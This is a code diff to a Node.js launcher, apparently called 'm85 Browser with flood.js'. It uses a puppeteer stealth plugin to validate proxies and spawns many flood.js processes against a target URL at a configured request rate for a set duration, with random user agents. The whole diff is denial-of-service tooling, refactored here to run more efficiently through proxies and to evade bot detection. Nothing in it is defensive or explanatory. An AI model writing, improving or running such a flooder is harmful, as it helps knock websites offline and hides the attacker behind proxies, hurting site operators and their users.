@@ -7,7 +7,8 @@ const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 puppeteer.use(StealthPlugin());
 
 // Configuration
-const TIMEOUT = 30000; // 30 seconds
+const TIMEOUT = 15000; // Reduced to 15 seconds
+const MAX_CONCURRENT_BROWSERS = 3; // Limit concurrent browser instances
 
 // Colors for logging
 const colors = {
@@ -77,22 +78,59 @@ function getRandomUA() {
 // Sleep function
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// ALWAYS spawn flood.js - even if proxy fails
-async function openBrowserAndSpawn(proxy, id) {
-  const userAgent = getRandomUA();
+// Browser pool to reuse instances
+class BrowserPool {
+  constructor(maxSize) {
+    this.maxSize = maxSize;
+    this.pool = [];
+    this.active = new Set();
+  }
+
+  async acquire() {
+    // Wait if pool is empty and we're at max capacity
+    while (this.active.size >= this.maxSize) {
+      await sleep(100);
+    }
+
+    let browser = this.pool.pop();
+    if (browser) {
+      this.active.add(browser);
+      return browser;
+    }
+
+    return null;
+  }
+
+  release(browser) {
+    this.active.delete(browser);
+    if (this.pool.length < this.maxSize) {
+      this.pool.push(browser);
+    } else {
+      browser.close().catch(() => {});
+    }
+  }
+
+  async closeAll() {
+    const allBrowsers = [...this.pool, ...this.active];
+    this.pool = [];
+    this.active.clear();
+    await Promise.all(allBrowsers.map(b => b.close().catch(() => {})));
+  }
+}
+
+// Simplified browser opening - NO page navigation to prevent tabs
+async function quickBrowserCheck(proxy, id) {
   let browser = null;
-  let title = "Unknown";
-  let cookieString = "";
   
   // Simple proxy formatting
   let proxyUrl = proxy.trim();
   proxyUrl = proxyUrl.replace(/^https?:\/\//, '');
   proxyUrl = `http://${proxyUrl}`;
   
-  log("info", `[${id}] Processing proxy: ${proxy}`);
+  log("info", `[${id}] Quick check proxy: ${proxy}`);
   
   try {
-    // Try to launch browser (will continue even if it fails)
+    // Launch browser with minimal options
     const options = {
       headless: "new",
       ignoreHTTPSErrors: true,
@@ -102,49 +140,40 @@ async function openBrowserAndSpawn(proxy, id) {
         '--disable-setuid-sandbox',
         '--disable-dev-shm-usage',
         '--disable-gpu',
-        `--user-agent=${userAgent}`,
+        '--disable-background-timer-throttling',
+        '--disable-backgrounding-occluded-windows',
+        '--disable-renderer-backgrounding',
+        '--disable-accelerated-2d-canvas',
+        '--disable-component-extensions-with-background-pages',
+        '--disable-default-apps',
+        '--disable-extensions',
+        '--disable-sync',
+        '--disable-translate',
+        '--hide-scrollbars',
+        '--mute-audio',
+        '--no-default-browser-check',
+        '--no-first-run',
       ]
     };
     
-    browser = await puppeteer.launch(options).catch(e => null);
+    // Quick launch attempt - no navigation
+    browser = await puppeteer.launch(options);
     
-    if (browser) {
-      const pages = await browser.pages();
-      const page = pages[0];
-      page.setDefaultTimeout(TIMEOUT);
-      page.setDefaultNavigationTimeout(TIMEOUT);
-      
-      // Try to navigate
-      try {
-        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: TIMEOUT });
-        title = await page.title();
-        
-        // Get cookies if possible
-        const cookies = await page.cookies();
-        cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
-        
-        log("success", `[${id}] Browser loaded: ${title}`);
-      } catch (navError) {
-        log("warn", `[${id}] Navigation failed: ${navError.message}`);
-        title = "Failed to load";
-      }
-      
-      // Close browser
-      await browser.close().catch(e => null);
-    } else {
-      log("warn", `[${id}] Browser launch failed, but spawning flood.js anyway`);
-    }
+    // Immediately close the browser without creating any pages
+    await browser.close();
+    
+    log("success", `[${id}] Proxy works: ${proxy}`);
+    return true;
     
   } catch (error) {
-    log("error", `[${id}] Error: ${error.message}`);
+    log("warn", `[${id}] Proxy failed: ${error.message}`);
+    if (browser) await browser.close().catch(() => {});
+    return false;
   }
-  
-  // ALWAYS spawn flood.js - regardless of browser success
-  if (cookieString === "") {
-    cookieString = "no-cookies";
-    log("warn", `[${id}] No cookies captured, using default`);
-  }
-  
+}
+
+// Spawn flood.js directly without browser navigation
+async function spawnFlood(proxy, id) {
   log("success", `[${id}] 🚀 Spawning flood.js with proxy: ${proxy}`);
   
   const floodArgs = [
@@ -154,8 +183,8 @@ async function openBrowserAndSpawn(proxy, id) {
     "2",
     proxy,
     rates,
-    cookieString,
-    userAgent
+    "no-cookies",
+    getRandomUA()
   ];
   
   // Spawn flood.js process
@@ -172,8 +201,7 @@ async function openBrowserAndSpawn(proxy, id) {
   return {
     id: id,
     proxy: proxy,
-    pid: floodProcess.pid,
-    title: title
+    pid: floodProcess.pid
   };
 }
 
@@ -194,13 +222,14 @@ function cleanup() {
 async function main() {
   log("info", `╔════════════════════════════════════════╗`);
   log("info", `║     m85 Browser with flood.js         ║`);
-  log("info", `║     FORCING SPAWN - NO PROXY CHECK    ║`);
+  log("info", `║     OPTIMIZED - NO TAB SPAM           ║`);
   log("info", `╚════════════════════════════════════════╝`);
   log("info", `Target: ${targetURL}`);
   log("info", `Threads: ${threads}`);
   log("info", `Rate: ${rates} req/sec`);
   log("info", `Duration: ${duration} seconds`);
   log("info", `Total proxies: ${proxies.length}`);
+  log("info", `Max concurrent checks: ${MAX_CONCURRENT_BROWSERS}`);
   
   // Check if flood.js exists
   if (!fs.existsSync("flood.js")) {
@@ -227,51 +256,79 @@ async function main() {
   
   // Create queue of proxies
   const proxyQueue = [...proxies];
-  let activeThreads = 0;
   let spawned = 0;
-  let failed = 0;
+  let skipped = 0;
+  let activeQuickChecks = 0;
+  const maxQuickChecks = Math.min(threads, MAX_CONCURRENT_BROWSERS);
   
-  // Process function
+  // Quick check and spawn function - NO PAGE NAVIGATION
   async function processProxy(proxy, id) {
-    activeThreads++;
-    const result = await openBrowserAndSpawn(proxy, id);
-    activeThreads--;
-    spawned++;
+    activeQuickChecks++;
     
-    log("success", `[${id}] ✅ SPAWNED flood.js (${spawned}/${proxyQueue.length + proxies.length - proxyQueue.length})`);
+    // Quick browser check (no page navigation)
+    const isWorking = await quickBrowserCheck(proxy, id);
+    
+    if (isWorking) {
+      // Spawn flood.js immediately
+      await spawnFlood(proxy, id);
+      spawned++;
+      log("success", `[${id}] ✅ Spawned flood.js (${spawned}/${proxies.length})`);
+    } else {
+      skipped++;
+      log("warn", `[${id}] ❌ Proxy skipped (${skipped} failures so far)`);
+    }
+    
+    activeQuickChecks--;
     
     // Process next proxy if available
     if (proxyQueue.length > 0) {
       const nextProxy = proxyQueue.shift();
-      if (nextProxy) {
+      if (nextProxy && activeQuickChecks < maxQuickChecks) {
+        processProxy(nextProxy, id + threads);
+      } else if (nextProxy) {
+        // Wait for slot to open
+        while (activeQuickChecks >= maxQuickChecks) {
+          await sleep(100);
+        }
         processProxy(nextProxy, id + threads);
       }
     }
   }
   
-  // Start initial threads
+  // Start initial checks
   const startTime = Date.now();
-  for (let i = 0; i < Math.min(threads, proxyQueue.length); i++) {
+  const initialBatches = Math.min(maxQuickChecks, proxyQueue.length);
+  
+  for (let i = 0; i < initialBatches; i++) {
     const proxy = proxyQueue.shift();
-    processProxy(proxy, i + 1);
+    if (proxy) {
+      processProxy(proxy, i + 1);
+    }
   }
   
   // Wait for duration
-  log("info", `⏱ Running for ${duration} seconds...`);
+  log("info", `⏱ Running checks and floods for ${duration} seconds...`);
   
+  // Progress indicator
   const interval = setInterval(() => {
-    const remaining = Math.ceil((startTime + (duration * 1000) - Date.now()) / 1000);
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    const remaining = duration - elapsed;
     if (remaining > 0 && remaining % 10 === 0) {
-      log("info", `⏱ Time remaining: ${remaining} seconds | Spawned: ${spawned}`);
+      log("info", `⏱ Time remaining: ${remaining}s | Spawned: ${spawned} | Failed: ${skipped}`);
     }
   }, 10000);
   
-  // Wait until duration expires
+  // Wait for duration
   while (Date.now() < startTime + (duration * 1000)) {
     await sleep(1000);
   }
   
   clearInterval(interval);
+  
+  // Wait for any pending checks to complete
+  while (activeQuickChecks > 0 || proxyQueue.length > 0) {
+    await sleep(100);
+  }
   
   // Stop and cleanup
   log("warn", "\n⏱ Time limit reached, stopping flood.js processes...");
@@ -285,6 +342,7 @@ async function main() {
   log("info", "║           FINAL RESULTS                ║");
   log("info", "╚════════════════════════════════════════╝");
   log("success", `✅ flood.js processes spawned: ${spawned}`);
+  log("warn", `❌ Failed proxies: ${skipped}`);
   log("success", `📈 Spawn rate: ${((spawned / duration) * 60).toFixed(1)} per minute`);
   log("success", `🎯 Target: ${targetURL}`);
   log("success", `⚡ Rate: ${rates} requests/second per flood.js`);
